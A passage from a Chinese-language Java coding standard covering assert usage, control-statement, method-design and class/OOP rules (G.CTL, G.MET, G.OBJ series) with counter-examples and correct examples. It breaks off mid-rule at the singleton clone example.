默认情况下，断言（assert）是被禁用的，可以通过`-ea`或`-da`选项开启或关闭。断言（assert）的判断条件为false时会抛出 `AssertionError`，表示程序遇到了一个不可恢复的错误，对该错误不做处理会导致程序异常退出。断言（assert）只适用于开发调试阶段的问题定位。以下两种场景不应使用断言：

**1）运行态错误检查**

如下常见的运行态错误检查，不应使用断言（assert），否则可能因为运行态错误触发`AssertionError`导致程序异常终止或因为断言（assert）禁用而导致错误未处理。

- 无效的用户输入（如环境变量、命令行参数等）
- IO错误（如文件操作、网络通信等）
- 权限不足（如文件权限、用户权限等）
- Java虚拟机运行时错误（如堆栈溢出等）
- 系统资源耗尽（如文件句柄数不足等）

可以考虑使用如下方式替代断言（assert）：

- [Objects.requireNonNull和checkIndex系列](https://docs.oracle.com/en/java/javase/14/docs/api/java.base/java/util/Objects.html)
- [Guava Preconditions的checkXxx系列](https://guava.dev/releases/snapshot-jre/api/docs/)

【反例】

```java
InputStream inputStream = this.getClass().getClassLoader()
	.getResourceAsStream(resourceName);
assert inputStream != null;
... // 对inputStream执行其他操作
```

上述示例中，使用断言（assert）检查 `resourceName` 对应的资源不存在的情况，当资源不存在时会导致程序异常终止。

【正例】

```java
InputStream inputStream = this.getClass().getClassLoader()
	.getResourceAsStream(resourceName);
if (inputStream != null) {
	... // 对inputStream执行其他操作
}
```

上述示例中，使用`if`语句检查`InputStream`是否为null，然后进行对应的处理。

**2）逻辑代码执行**

在断言（assert）中执行业务逻辑代码，会导致程序因为断言（assert）的启用/禁用产生不同的逻辑。

【反例】

```java
public void doSomething(List list, Object element) {
    assert list.remove(element) : " Failed to remove the element: " + element;
    ...
}
```

上述示例中，直接在断言（assert）中执行list的 `remove()`操作。禁用断言（assert）时，list的`remove()`操作会被忽略。

【例外】

单元测试代码中可以使用断言（assert），但更推荐使用测试框架提供的断言方法。

### 3.4 控制语句

> G.CTL.01 不要在控制性条件表达式中执行赋值操作或执行复杂的条件判断

【级别】 要求

【描述】

控制性条件表达式常用于if、while、for、?:等条件判断中。

在控制性条件表达式中执行赋值或执行复杂的条件判断，常常导致意料之外的行为，且代码的可读性非常差。

复杂的条件判断是指在一个条件表达式中boolean运算符数量超过3。对于复杂的条件判断建议封装到一个独立的方法中，通过具有描述性的方法名让代码阅读者更容易理解复杂判断的目的，另外也方便对独立方法中的复杂条件判断逐步进行优化，最终使代码主流程和判断逻辑更加清晰可读。

【反例】

```java
if (isFoo = false) // 在控制性判断中赋值不易理解

if (isFoo == false) // 冗余不简洁，容易出错
    
if (false == isFoo) // 冗余不简洁，容易出错
    
public void fun(boolean isBar) {
    boolean isFoo;
    if (isFoo = isBar) {
    	...
    }
}

public void fun(boolean isBar, boolean isFlag) {
    boolean isFoo;
    while ((isFoo = isBar) && isFlag) {
    	...
    }
}
```

【正例】

```java
boolean isFoo = someBoolean; // 在上面赋值，if条件判断中直接使用
if (isFoo)

public void fun(boolean isBar) {
    boolean isFoo = isBar; // 在上面赋值，if条件判断中直接使用
    if (isFoo) {
    	...
    }
}

public void fun(boolean isBar, boolean isFlag) {
    boolean isFoo = isBar; // 在上面赋值，while条件判断直接使用
    while (isFoo && isFlag) {
    	...
    }
}
```

【例外】

控制性条件表达式中的子表达式中允许进行赋值运算，典型场景如下：

```java
while ((line = reader.readLine()) != null) {
	...
}
```

> G.CTL.02 含else if分支的条件判断应在最后加一个else分支

【级别】 建议

【描述】

含多个else if条件组合的判断逻辑，往往会出现被遗漏的分支，在最后设置一个else分支可对遗漏场景进行处理（类似于switch-case语句要有default分支）。

最后的else分支如果没有明确的处理场景，可以记录一条日志或抛出异常等，如：`log("unknown condition")`、`throw new IllegalStateException("non-exhaustive cases")`等。

【反例】

```java
if ((employee.flags & HOURLEY_FLAG) && (employee.age > RETIRED_AGE)) {
	...
} else if ((employee.flags & HOURLEY_FLAG) && (employee.age < RETIRED_AGE)) {
	...
} else if ((employee.flags & HOURLEY_FLAG) && (employee.age == RETIRED_AGE)) {
	...
}
```

【正例】

```java
if ((employee.flags & HOURLEY_FLAG) && (employee.age > RETIRED_AGE)) {
	...
} else if ((employee.flags & HOURLEY_FLAG) && (employee.age < RETIRED_AGE)) {
	...
} else if ((employee.flags & HOURLEY_FLAG) && (employee.age == RETIRED_AGE)) {
	...
} else {
	...
}
```

如果在条件分支中只是对同一个布尔变量根据各个条件值来赋值，可以将条件语句简化为一个直接对此布尔变量赋值的语句。如：

```java
boolean isResolved;
if(foo()) {
	isResolved = true;
} else { // 也可能没有else分支
	isResolved = false;
}
```

上面的代码示例可以直接优化为 `boolean isResolved = foo();` 。

> G.CTL.03 switch语句要有default分支

【级别】 要求

【描述】

每个switch语句都应该包含一个default分支，即使default分支没有业务逻辑代码。default分支中没有业务逻辑代码时，可以记录一条日志或抛出异常等，如： log("unknown condition") 、 throw new IllegalStateException("non-exhaustive cases") 等。

【例外】

对于枚举类型的switch语句，已经明确涵盖所有可能的场景，可以省略default分支。IDE或其他静态分析工具也能在switch语句缺少枚举场景时，发出警告。

> G.CTL.04 循环必须保证可正确终止

【级别】 要求

【描述】

错误终止循环可能会导致无限循环，性能不佳，错误结果以及其他问题。在用于终止循环的任何条件下，攻击者都可能影响这些错误，这些错误可被利用来导致拒绝服务或其他攻击。所以在实现循环语句时，要能保证循环可以安全的终止，避免出现无限循环的问题。

常见导致无限循环的场景包括但不限于以下场景：

- while(true)中缺少合适的break语句；
- 循环变量未正确修改；
- 直接使用外部输入作为循环终止的判断条件；
- 不当的循环终止条件判断；
- 使用浮点数作为循环计数器（浮点数章节已经说明）。

另外，代码中更不应该出现空的无限循环，编写一个空的循环体，不会完成具体功能，反倒可能会消耗CPU；另一方面，如果刻意编写空循环来消耗CPU，却又可能被编译器或者JIT优化而消除。

【反例】（缺少break语句导致无限循环）

```java
public void alwaysRun() {
    while (true) {
        if(condition()) {
        	doSomething();
        } else{
        	doSomethingElse();
        }
    }
}
```

上述示例中，`while(true)`循环中缺少`break`语句，导致循环无法正确终止。

【正例】

```java
public void notAlwaysRun() {
    while (true) {
        if(condition()) {
        	doSomething();
        	break;
        } else{
        	doSomethingElse();
        }
    }
}
```

【反例】（循环变量处理不当导致无限循环）

```java
public void alwaysRun() {
    int index = 0;
    while (index < 100) {
        if(condition(index)) {
            doSomething();
            continue;
        }
        index ++;
    }
}
```

上述示例中，当循环变量在某个条件下，无法正常更新，导致循环无法正常终止。

【反例】（直接使用外部输入作为循环终止的判断条件）

```java
public void alwaysRun() {
    int maxCount = request.getParameter("count");
    ...
    for(int i = 0; i <= maxCount; i++){
    	doSomething();
    }
}
```

上述示例中，当外部指定的`count`的值为`Integer.MAX_VALUE`时，会导致循环无法终止。

【反例】（不当的循环终止条件判断）

```java
public void alwaysRun() {
    ...
    for(int i = 1; i != 10; i += 2){
    	doSomething();
    }
    ...
}
```

上述示例中，由于循环变量的值无法准确得到10，导致循环无法终止，这类场景建议使用 <、<=、>、= 这类比较操作符来判断循环的终止条件。

【反例】（空的无限循环）

```java
public void alwaysRun() {
    while (true) {
    	// 什么也不做
    }
}
```

上述示例中，编写了一个`alwaysRun()`方法试图模拟一个空闲任务，然而它并非一定能满足开发者的预期，因为编译器或者JIT可能会因为优化而删除这个循环。

> G.CTL.05 避免在循环体中修改循环控制变量

【级别】 建议

【描述】

如果在循环体的操作中异向地修改循环控制参数的数值，可能导致循环退出条件永远达不到（死循环）或者循环执行次数不符合预期。

【反例】

```java
public void alwaysRun() {
    ...
    for(int i = 1; i <= 10; i++){
        if(condition()){
        	doSomething();
        }else{
        	i -= 2;
        }
    }
    ...
}
```

上述示例中，存在对循环变量的异向修改，循环执行的次数将取决于代码中if的条件在循环过程中的满足情况，很可能永远无法退出循环。

【正例】

```java
public void alwaysRun() {
    ...
    for(int i = 1; i <= 10; i++){
    	doSomething();
    }
    ...
}
```

上述示例中，在循环体中不对循环变量进行调整。

> G.CTL.06 禁止switch语句中直接嵌套switch

【级别】要求

【描述】switch语句中直接嵌套switch语句，会增加代码的复杂度，代码的可读性也会变差。

【反例】

```java
switch (condition1) {
    case "case11":
        switch (condition2) {
            case "case21":
                doSomethingCase1();
                break;
            case "case22":
                doSomethingCase2();
                break;
            default:
                doSomethingDefault();
        }
        break;
    case "case12":
        doSomething();
        break;
    default:
        doSomethingDefault();
}
```

上述示例中，存在两层switch语句，代码的可读性比较差。

【正例】

```java
//...
switch (condition1) {
    case "case1":
        doSomething(condition2);
        break;
    case "case2":
        doSomethingElse();
        break;
    default:
        doSomethingDefault();
}
//...
private void doSomething(String condition2) {
    switch (condition2) {
        case "case1":
            doSomethingCase1();
            break;
        case "case2":
            doSomethingCase2();
            break;
        default:
            doSomethingDefault();
    }
}
```

上述示例中，将第二层switch抽取出一个单独的方法，这样代码逻辑比较清晰。

### 3.5 方法

#### 3.5.1 方法设计

方法设计的精髓：方法是可组合、可重用的代码最小单位，编写高内聚低耦合的整洁方法，同时把代码有效组织起来。代码简单直接、不隐藏设计者的意图、用干净利落的抽象和直截了当的控制语句将方法有序组织起来。

契约式设计、防御式编程有利于编写安全可靠的代码。可以用在要求满足前置/后置条件的场景，例如null判断。

不要使用运行时类型擦除后相同的重载方法。

为了减少大量参数的显式判空，提高性能或可读性，需要明确告知由调用者保证null safety，代码中可以使用符合JSR 303规范和JSR 305规范的工具类进行正确性校验。下方列举部分符合规范的注解，如果使用了下列注解，那么可以直接写`nonNullParam.something`；否则，一个`public`或`protected`方法如果没有显式地对参数判空，就认为存在null safety风险。

- javax.annotation.ParametersAreNonnullByDefault
- android.support.annotation.NonNull
- androidx.annotation.NonNull
- org.jetbrains.annotaions.NotNull
- lombok.NonNull
- @apiNote 警示了如果参数为空则抛出异常，并且存在 @throws NullPointerException 

方法要设计合适的返回值来指示对象的当前状态或执行结果，对于希望方法返回值必须校验的场景，可以添加`@CheckReturnValue`注解；这类具有返回值的方法（尤其是有`@CheckReturnValue`注解的方法）执行后要对返回值做检查，并对不同的返回值作出相应的处理。

对于Native方法，可对其进行封装，封装的方法中进行安全管理器检查、参数校验、返回值校验、可变值的防御性复制等安全操作。

使用JDK自带的API或广泛使用的开源库，不要重新写类似的功能。

> G.MET.01 方法要简短

【级别】 建议

【描述】

复杂过长的方法往往意味着方法抽象层次不足或功能不够单一。建议方法要进行合理抽象分层，对功能不够单一的方法使用合理的手段进行重构，以提升代码的可读性、可维护性。

可以考虑从以下维度间接约束方法的尺寸和复杂度：

- 方法中的代码行数不要太多，例如建议方法中的非空非注释代码行不超过50行（具体阈值可根据实际情况进行调整）；
- 方法的参数个数不要太多，例如建议方法参数不超过5个（具体阈值可根据实际情况进行调整）；
- 方法中代码块嵌套层数不要太多，例如建议方法中代码块的嵌套层数不要超过4（具体阈值可根据实际情况进行调整）；
- 方法中抛出的异常种类不要太多，建议异常种类不超过5类。

**方法参数**

方法的参数过多，会使得该方法易于受外部（其他部分的代码）变化的影响，从而影响维护工作，同时也会增大测试的工作量。方法的参数过多时，可以考虑如下优化方式：

- 对方法进行抽象或重构；
- 将相关参数合在一起，定义成类，用对象封装；
- 当构造方法含有多个参数时，尝试建造者（Builder）或工厂模式，JDK源码中有很多示例可供参
  考，例如Calendar.Builder，HttpClient.Builder。

**代码块嵌套深度**

方法的代码块嵌套深度指的是方法中的代码控制块（例如：if、for、while、switch等）之间互相包含的深度。方法本身算一层，try-catch不算一层嵌套。方法内的lambda表达式、局部类和匿名类嵌套层次以最内层方法来计算，不累计enclosing method的嵌套层次。使用`卫语句`可以有效的减少if相关的嵌套层次。

【正例】原代码嵌套层数是 3：

```java
int foo(Item msg) {
    //...
    if (isReceived) {
        type = getMsgType(msg);
        if (type != UNKNOWN) {
            return dealMsg(type);
        }
    }
    return -1;
}
```

重构技法：使用`卫语句`重构，嵌套层数变成 2。

```java
int foo (Item msg){
    //...
    if (!isReceived) {
        return -1;
    }
    type = getMsgType(msg);
    if (type == UNKNOWN) {
        return -1;
    }
    return dealMsg(type);
}
```

还可以考虑使用`Stream`来减少嵌套和圈复杂度。例如[JDK Stream docs上1行代码的简洁例子](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/util/stream/package-summary.html)，如果用传统写法很冗长：

```java
List<JLabel> widgets = List.of(new JLabel());
int sum = 0;
for (JLabel lb : widgets) {
    if (lb.getBackground() == RED) {
        int width = lb.getWidth();
        sum += width;
    }
}
```

> G.MET.02 不要使用已标注为`@Deprecated`的方法、类、类的属性等

【级别】 要求

【描述】

标注为`@Deprecated`的方法、类、类的属性等，是由于各种原因被废弃的，为了保持兼容性而没有删除。新写的代码应避免继续使用这些方法、类等，而应该使用推荐的代替实现。

#### 3.5.2 方法参数与返回值

> G.MET.03 不应把方法的参数当做临时变量

【级别】 建议

【描述】

每个变量/参数都有自己独特的功用，让一个变量承担多个职责，**变量名**将无法清晰表达其功能，会使程序难以理解。
为减轻因疏忽导致的**再次对参数赋值**，可在参数前加`final`关键字。

【反例】

```java
int doSomething(int inputData) {
    inputData = inputData * getMultiplier(inputData);
    inputData = inputData + getAdder(inputData);
    return inputData;
}
```

上述示例中，方法参数用作临时变量，增加了程序理解的难度。

【正例】

```java
int doSomething(final int basicSalary) { // 使用final能够帮助判断，避免意外修改
    int performanced = basicSalary * getMultiplier(basicSalary);
    int bonused = performanced + getAdder(performanced);
    ...
    return bonused;
}
```

上述示例中，方法参数命名与业务逻辑相匹配，参数功能单一，代码逻辑清晰。

【例外】

对引用类型的参数，允许修改其引用对象的内部属性（例如调用其set方法对属性进行修改）。

> G.MET.04 谨慎使用可变数量参数

【级别】 建议

【描述】

在Java 5版本中初次引入可变数量参数（variable number of arguments）特性，该特性支持方法接受指定类型的零个到多个参数。使用可变数量参数时，要注意如下两类问题：

- 不建议使用可变数据参数方法重写使用一个固定长度数组作为参数的方法，这样会导致代码可读性变差；
- 可变类型参数的类型要明确，避免使用Object等模糊类型，方便Java编译器对参数类型进行检查。

【反例】

```java
public double sum(double... values) {
	...
}
public double sum(double value1, double value2) {
	...
}
```

上述示例中，对可变数量参数方法进行了重载，可能会导致对于 `sum(23d, 32d)` 不确定实际执行的是哪个方法。

> G.MET.05 对于返回数组或者容器的方法，应返回长度为0的数组或者容器，代替返回null

【级别】 建议

【描述】

在方法返回值中，用长度为0的数组或者容器，来代替返回null，则上层调用代码在使用此返回的数组或者容器前，无需再判断是否为空，业务逻辑一气呵成，代码更简洁。

同时，也避免了程序员因为忘记了对返回值进行空指针检查，而导致的 NullPointerException。

方法的返回值可以为null时，应该添加注释充分说明什么情况下会返回null值，以下情况可以不添加注释：

- 有些不得不override的方法，返回null时可以不加注释。
- 已经用@Nullable等注解为可空的，返回null时可以不加注释。

【反例】

```java
public static List<String> decorate(String[] personDescs) {
    if (personDescs == null || personDescs.length == 0) {
        return null; // 返回null，上层代码需要对该返回值判null，否则会出现NPE
    }
    List<String> personNames = new ArrayList<>(personDescs.length);
    for (String personDesc : personDescs) {
        String personName = getPersonName(personDesc);
        personNames.add(personName);
    }
    return personNames;
}

public static void main(String[] args) {
    //...
    List<String> personNames = decorate(personDescs);
    if (personNames == null) {
        return;
    }
    for (String personName : personNames) {
        //...
    }
}
```

上述示例中，被调用方法在发现参数不满足要求时，返回null给外层调用者。

外层调用者必须时刻记得 检查返回值是否为null，否则会发生空指针异常。而添加检查代码后，代码臃肿。

【正例】

```java
public static List<String> decorate(String[] personDescs) {
    if (personDescs == null || personDescs.length == 0) {
        return Collections.emptyList(); // 返回空的集合，上层调用不需要判空，代码书写更流畅
    }
    List<String> personNames = new ArrayList<>(personDescs.length);
    for (String personDesc : personDescs) {
        String personName = getPersonName(personDesc);
        personNames.add(personName);
    }
    return personNames;
}

public static void main(String[] args) {
    // personDescs.length为0
    List<String> personNames = decorate(personDescs);
    for (String personName : personNames) {
        //...
    }
}
```

上述示例中，被调用方法在发现参数不满足要求时，返回空容器给外层调用者。外层调用无需检查返回值是否为null，一套代码解决问题。

> G.MET.06 使用 `Optional` 代替null作为返回值或者可能的缺失值；禁止对 `Optional` 对象赋值为null

【级别】 建议

【描述】

`Optional`可以表示两种情形：一种是存在值，一种是缺失值。例如`Optional<String> email`，可以表示email是有或无值的。

 `Optional`常见的使用场景在集合库，例如`Map<Integer, Optional<String>> idEmails`，表示有的ID对应的Email是可选存在的。

`Optional`在现代编程语言Scala、Rust、Swift中都已经被支持了，是标准的nullable值的处理方式，它的好处有：避免空指针异常，减少频繁地嵌套式判空处理，让业务逻辑更直观。

`Optional`是[value-based class](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/lang/doc-files/ValueBased.html)，java.time包中许多类也是。value-based类特意实现了`equals`、`hashCode`和`toString`方法，这些实现仅根据实例本身的状态进行计算而不是实例的标识或任何其他对象或变量的状态，推荐用`equals`而不是`==`做相等比较。值类型，未来版本称为[inline type](https://wiki.openjdk.org/display/valhalla/L-World)， 它们是final、small、immutable、identity-less types，JVM会做性能优化。

`Optional`的使用场景是尽可能减少null的直接使用，包括RPC调用、缓存和数据库查询等可能返回缺失的情形。如果API作者强烈要求调用者关注结果可能为null，需要精心处理，那么方法应该返回`Optional<T>`。

- **禁止对**`**Optional**`**对象赋值/返回为null，或与null比较**，例如：`Optional<Foo> foo = null;`
- 不应该返回 `Optional<Integer>` 、`Optional<Long>`、`Optional<Double>`，而应该使用`OptionalInt`、`OptionalLong`、 `OptionalDouble`
- 如果文档注释明确返回值是用于数值计算密集型、或者用于序列化，那么可以返回T或者null，无需`Optional<T>`
- 一般不应该返回`Optional<集合或数组>`，而用空集合或空数组替代

例如，以下`optionalExample()`方法展示了`Optional`的典型用法：

```java
Optional<Image> filter(Image bitmap) {
    return Optional.of(bitmap);
}

Optional<Image> scale(Image bitmap) {
    return Optional.of(bitmap);
}

public void optionalExample(String path, ImageView view) {
    Optional<Image> maybeBitmap = readFromFile(path);
    maybeBitmap.flatMap(bitmap -> filter(bitmap)).flatMap(bitmap -> scale(bitmap))
        .ifPresent(bitmap -> view.setImage(bitmap));
}

Optional<Image> readFromFile(String path) {
    return Optional.empty();
}
```

> G.MET.07 不要忽略方法的返回值

【级别】 建议

【描述】

方法的返回值通常用于表示方法执行结果、返回数据或更新对象等，方法调用者应该对方法的返回值进行合理的处理，否则可能因为方法执行结果与预期不符导致安全风险。

资源操作类方法会通过返回值来指示本次操作是否成功（例如`File.delete()`），这类方法调用后必须根据返回值对资源操作失败的场景进行防护处理。

`@CheckReturnValue`注解用于强调对该方法的返回值必须进行检查。调用这类方法时必须对其返回值进行校验。对于自定义方法，希望调用方不要忽略对应的返回值时，建议添加该注解。

【反例】

```java
public void deleteFile() {
    File someFile = new File("someFileName.txt");
    // Do something with someFile
    someFile.delete();
}
```

上述示例中，删除文件操作没有判断文件是否成功被删除，默认文件都能被删除，这样的错误判断可能会导致系统存在安全可靠性风险。

【正例】

```java
public void deleteFile() {
    File someFile = new File("someFileName.txt");
    // Do something with someFile
    if (!someFile.delete()) {
    	// Handle failure to delete the file
    }
}
```

上述示例中，文件删除操作完成后会判断该操作是否成功，文件删除失败会采取针对性的防御处理。

### 3.6 类、接口与面向对象编程

#### 3.6.1 类

可使用Lambda表达式或方法引用代替匿名类。

在设计class时，要为class及其成员设置最小的可访问性。

class声明时，要尽量避免package之间的循环依赖。

> G.OBJ.01 应避免定义`public`且非`final`的类属性

【级别】 建议

【描述】

将类的属性设置为私有（private）的理由是：不希望类的外部代码依赖这个属性，依赖类内部的实现细节。这样，当内部实现需要变更时，影响面就比较小，变更的成本就比较低。不应该使用系统属性（System.setProperties/System.getProperties）来配置和传递信息。这种一般也不常见，但如果发生，很难察觉。

> G.OBJ.02 不要在父类的构造方法中调用可能被子类覆写的方法

【级别】 要求

【描述】

当在父类的构造方法中调用可能被子类覆写的方法时，构造方法的表现是不可预知的，很可能会导致异常。问题出现后，往往难快速定位。

这是由于在Java中，当子类初始化时，会调用父类的构造方法，当父类构造方法调用了被子类覆写的方法，往往会由于子类的初始化未完成而导致异常。

【反例】

```java
public class SeniorClass {
    public SeniorClass() {
        toString(); // 如果toString()被覆写了，可能会导致异常
    }
    @Override
    public String toString() {
        return "IAmSeniorClass";
    }
}

public class JuniorClass extends SeniorClass {
    private String name;
    public JuniorClass() {
        super(); // 调用父类的构造方法，导致NullPointerException异常
        name = "JuniorClass";
    }
    @Override
    public String toString() {
        return name.toUpperCase();
    }
}
```

【正例】（构造方法中调用`private`方法）

```java
public class SeniorClass {
    public SeniorClass() {
        doSomething() ;
    }
    private String doSomething() {
        //...
        return "IAmSeniorClass";
    }
}
```

上述示例中，构造方法中调用方法是private，子类是无法对该方法进行覆写的。

【正例】（构造方法中调用`final`方法）

```java
public class SeniorClass {
    public SeniorClass() {
        doSomething() ;
    }
    public final String doSomething() {
        //...
        return "IAmSeniorClass";
    }
}
```

上述示例中，构造方法中调用了`final`修饰的方法，该方法是不支持子类进行覆写的。

【正例】（`final`类）

```java
public final class SeniorClass {
    public SeniorClass() {
        doSomething() ;
    }
    public String doSomething() {
        //...
        return "IAmSeniorClass";
    }
}
```

上述示例中，SeniorClass类声明中使用了`final`关键字，该类不能派生子类。

> G.OBJ.03 构造方法如果有多个，尽量重用

【级别】建议

【描述】由于可选参数导致的存在多个构造方法时，参数少的构造方法可以重用参数更多的构造方法。

【正例】

```java
public class Student {
    private String name;
    private String sex;
    private int weight; // 可选参数
    private int height; // 可选参数
    private int age; // 可选参数
    
    public Student(String name, String sex) {
        this(name, sex, 0);
    }
    
    public Student(String name, String sex, int weight) {
        this(name, sex, weight, 0);
    }
    
    public Student(String name, String sex, int weight, int height) {
        this(name, sex, weight, height, 0);
    }
    
    public Student(String name, String sex, int weight, int height, int age) {
        this.name = name;
        this.sex = sex;
        this.weight = weight;
        this.height = height;
        this.age = age;
    }
        
    //...
}
```

> G.OBJ.04 避免在无关的变量或无关的概念之间重用名字，避免隐藏（hide）、遮蔽（shadow）和遮掩（obscure）

【级别】 要求

【描述】

在声明子类的属性、方法或嵌套类型时，除了覆写（override）、重载（overload）之外，要尽量避免重名导致的隐藏（hide）、遮蔽（shadow）和遮掩（obscure）。

这些名字重用的术语定义如下：

**覆写（override）------子类与父类间**

一个类的实例方法可以覆写（override）在其超类中可访问到（非private）的具有相同签名的实例方法（非static），从而使能了动态分派（dynamic dispatch）；换句话说，VM将基于实例的运行期类型来选择要调用的覆写方法。

```java
class Base {
    public void fn() {
    	...
    }
}
class Derived extends Base {
    @Override
    public void fn() { // 覆写Base.fn()
    	...
    }
}
```

**重载（overload）------类内部**

在某个类中的方法可以重载（overload）另一个方法，只要它们具有相同的名字和不同的签名。由调用所指定的重载方法是在编译期选定的。重载的方法应该按顺序放在一起，中间不要插入其他的方法，以提升代码的可读性。使重载产生歧义或混淆的场景包括：

- 可变参数；
- 包装类型，例如参数分别是int与Integer。

以上场景，不应该使用重载，应该修改方法名，如果是构造方法，则委托到不同名的静态方法。

```java
class CircuitBreaker {
    public void fn(int it) {}
    public void fn(String str) {}
}
```

**隐藏（hide）------子类与父类间**

一个类的属性、静态方法或内部类可以分别隐藏（hide）在其超类中可访问到的具有相同名字（对方法而言就是相同的方法签名）的所有属性、静态方法或内部类。上述成员被隐藏后，将阻止其被继承：

```java
class Swan {
    protected String name = "Swan";
    public static void fly() {
        System.out.println("swan can fly ...");
    }
}

class UglyDuck extends Swan {
    protected String name = "UglyDuck";
    public static void fly() { // 隐藏Swan.fly
        System.out.println("ugly duck can't fly ...");
    }
}

public class TestFly {
    public static void main(String[] args) {
        Swan swan = new Swan();
        Swan uglyDuck = new UglyDuck();
        swan.fly(); // 打印swan can fly ...
        uglyDuck.fly(); // 还是打印swan can fly ...，hide让人以为是覆写了，其实不是
        System.out.println(swan.name); // 打印 Swan
        System.out.println(uglyDuck.name); // 打印 Swan
    }
}
```

**遮蔽（shadow）------类内部**

一个变量、方法或类可以分别遮蔽（shadow）在类内部具有相同名字的变量、方法或类。如果一个实体被遮蔽了，那么就无法用简单名引用到它：

【反例】

方法的局部变量遮蔽了类的静态变量

```java
public class WhoKnows {
    static String sentence = "I don't know.";
    public static void main(String[] args) {
        String sentence = "I know!"; // 遮蔽了类的静态成员sentence
        System.out.println(sentence); // 打印的是I know！
    }
}
```

**遮掩（obscure）------类内部**

一个变量可以遮掩具有相同名字的一个类，只要它们都在同一个范围内：如果这个名字被用于变量与类都被许可的范围，那么它将引用到变量上。相似地，一个变量或一个类型可以遮掩一个包。
遮掩是唯一一种两个名字位于不同的名字空间的名字重用形式，这些名字空间包括：变量、包、方法或类型。如果一个类或一个包被遮掩了，那么不能通过其简单名引用到它。

遵守命名习惯可以极大地消除产生遮掩的可能性。

【反例】（变量命名也违反了小驼峰命名的规则）

```java
public class Obscure {
    static String System; // 遮掩java.lang.System
    public static void main(String[] args) {
        // 下面这行无法编译: System引用到static属性
        System.out.println("hello, obscure world!");
    }
}
```

> G.OBJ.05 避免基本类型与其包装类型的同名重载方法

【级别】 建议

【描述】

有歧义的重载或者误导性的重载，会导致非预期的结果。

方法与构造方法的重载特性允许声明名字相同、参数不同的方法或构造方法。编译器在每次调用时都会去探查与调用参数相匹配的方法。但在自动装箱和泛型场景下，可能会导致各个重载方法之间的边界变得模糊。此外，有些方法或构造方法的重载方法在参数类型上完全一样，不同的仅仅是参数的顺序，Java编译器不会对这种重载方式报任何异常。如果程序员在调用方法前不仔细看API文档的话，就很容易出错。

另外，方法重载也要避免使用存在继承关系的参数。

【反例】

```java
class SomeResource {
    HashMap<Integer, Integer> hm = ...;
    
    public SomeResource(int id, String name) {
        ...
    }
    
    public SomeResource(Integer id, String name) {
        ...
    }
    
    public String getData(Integer id) { // 重载序列 #1
        // 获取一个特定的记录
        String str = hm.get(id).toString();
        return str + SUFFIX;
    }
    
    public Integer getData(int id) { // 重载序列 #2
        // 获取在位置id的记录
        return hm.get(id);
    }
}
```

【正例】

```java
class SomeResource {
    HashMap<Integer, Integer> hm = ...;
    
    public static Employee createSomeResourceByInt(int id, String name) {
        // 非重载，使用int类型的id构造对象
    }
    
    public static Employee createSomeResourceByInteger(Integer id, String name) {
        // 非重载，使用Integer类型的id构造对象
    }
    
    public Integer getDataByIndex(int id) {
        // 非重载
    }
    
    public String getDataByValue(Integer id) {
        // 非重载
    }
}
```

> G.OBJ.06 覆写equals方法时，要同时覆写hashCode方法

【级别】 要求

【描述】
Java中 `==` 、`!=` 运算符用于对象比较时，比较的是两个对象是否引用（references）的同一个对象，不会判断两个对象逻辑上是否相等。

Java中的基类 Object 中的 `equals()` 方法实现的逻辑与 `==` 运算符是相同。

当对象需要进行逻辑相等的比较时（比如判断String、Integer对象中的值是否相同），应对 `Object` 的`equals()` 方法进行覆写，在该方法中实现具体的判断逻辑。覆写 `equals()` 方法时，要同步覆写 `hashCode()` 方法。Java对象在存放到基于Hash的集合（如 `HashMap`、 `HashTable` 等）时，会使用其 Hash码 进行索引，如果只覆写了 `equals` 方法，而没有正确覆写 `hashCode` 方法，则会导致效率低下甚至出错。

Java对象的 `hashCode` 方法有如下约定：

1. 同一次运行中，同一个对象如果 `equals` 方法中用到的信息没有改变，多次调用其 `hashCode` 方法返回值必须相同；
2. 如果对两个对象调用 `equals` 方法时相等，则这两个对象的 `hashCode` 方法，也必须返回相同的值；
3. 如果对两个对象调用 `equals` 方法时不相等，则对这两个对象的 `hashCode` 方法，不要求其返回值不同，但是出于减少哈希碰撞的性能考虑，最好能不同。

Java对象进行逻辑相等判断时，必须调用覆写的 `equals()` 方法进行比较，不要使用 `==` 、`!=` 运算符进行比较。当需要比较两个字符串（String类型的对象）是否相等时，应使用 `equals()`方法，当忽略大小写字母差异比较时，应使用 `equalsIgnoreCase()` 方法。

【反例】

```java
public class Entity {
    private String id;
    private String value;
    @Override
    public boolean equals(Object obj) {
        ...
        if (obj instanceof Entity) {
            Entity that = (Entity) obj;
            return Objects.equals(this.id, that.id)
                    && Objects.equals(this.value, that.value);
        }
        ...
        return false;
    }
}
```

上述示例中，覆写 `equals` 方法的时候，没有同时覆写 `hashCode` 方法。

> G.OBJ.07 子类覆写父类方法或实现接口时必须加上`@Override`注解

【级别】 要求

【描述】

加上`@Override`注解的好处是，如果覆写时因为疏忽，导致子类方法的参数同父类不一致，编译时会报错，使问题在编译期就被发现；如果父类修改了方法定义造成子类不再覆写父类方法，也能使问题在编译期尽早被发现。

> G.OBJ.08 正确实现单例模式

【级别】 建议

【描述】

单例模式（Singleton Pattern）属于创建型模式，它确保在同一个进程内，单例类只有一个对象，并且该对象对所有其他对象提供访问，常见的如Windows系统下的资源管理器、Spring中的Bean等都会采用这种方式。

一般来说，正确实现单例有如下几点要求：

- 将其构造方法设为私有；
- 防止对象在初始化被多个线程同时运行；
- 确保该对象不可序列化；
- 确保该对象无法克隆。

【反例】（非私有构造方法）

```java
class UntrustedSingletonDemo {
    private static UntrustedSingletonDemo instance;
    protected UntrustedSingletonDemo() {
        instance = new UntrustedSingletonDemo();
    }
}
```

【反例】（无法防止并发调用的场景）

```java
class UntrustedSingletonDemo {
    private static UntrustedSingletonDemo instance;
    
    private UntrustedSingletonDemo() {
    }
    
    public static UntrustedSingletonDemo getInstance1() {
        if (instance == null) {
            instance = new UntrustedSingletonDemo();
        }
        return instance;
    }
    
    public static UntrustedSingletonDemo getInstance2() {
        if (instance == null) {
            synchronized (UntrustedSingletonDemo.class) {
                instance = new UntrustedSingletonDemo();
            }
        }
        return instance;
    }
}
```

【反例】（可以通过反序列化来构造多个实例）

```java
class UntrustedSingletonDemo implements Serializable {
    private static final long serialVersionUID = 6825273283542226860L;
    private static UntrustedSingletonDemo instance;

    private UntrustedSingletonDemo() {
    }

    public static synchronized UntrustedSingletonDemo getInstance() {
        if (instance == null) {
            instance = new UntrustedSingletonDemo();
        }
        return instance;
    }
}
```

【反例】（可以通过调用clone方法获得新的实例）

```java
